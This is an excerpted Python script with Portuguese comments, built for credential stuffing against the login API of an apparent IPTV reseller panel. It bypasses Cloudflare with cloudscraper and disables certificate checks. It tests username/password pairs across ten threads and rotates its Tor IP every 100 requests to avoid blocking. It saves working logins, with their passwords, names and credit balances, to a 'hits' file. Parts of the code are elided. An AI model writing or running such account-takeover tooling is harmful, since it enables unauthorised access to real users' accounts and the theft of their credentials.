...
# Desativar a verificação de hostname
...
def renew_tor_ip():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password='your_password')  # Substitua pela senha do seu Tor
        controller.signal(Signal.NEWNYM)
        time.sleep(5)  # Aguarde alguns segundos para que o IP seja renovado

def login_and_get_dashboard(username, password):
    scraper = cloudscraper.create_scraper()
    login_url = 'https://az.brtv.me/sys/api.php'
    login_headers = {
    ...
    try:
        with requests.Session() as session:
            ...
            login_response = scraper.post(login_url, headers=login_headers, data=login_data, verify=False)
            login_json = login_response.json()
            if not login_json.get('success'):
                return None, None
            dashboard_url = 'https://az.brtv.me/dashboard'
            dashboard_headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'referer': 'https://az.brtv.me/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                'upgrade-insecure-requests': '1'
            }
            dashboard_response = scraper.get(dashboard_url, headers=dashboard_headers, verify=False)
...
def process_account(user, password, i, total):
    ...
    if name and credits:
        ...
        with open("/content/drive/MyDrive/_Paineis/hits/az_tv_hits.txt", "a") as hit_file:
            hit_file.write(f"\\n===<Sr.Hell/>===\\n• User: {user}\\n• Pass: {password}\\n===<info user/>===\\n• Nome: {name}\\n• Créditos: {credits}\\n")
        return True
    else:
        ...
        with ThreadPoolExecutor(max_workers=10) as executor:
            ...
            for future in as_completed(futures):
                ...
                if len(futures) % 100 == 0:
                    ...
                    time.sleep(0.1)
                    renew_tor_ip()  # Renova o IP do Tor a cada 100 requisições
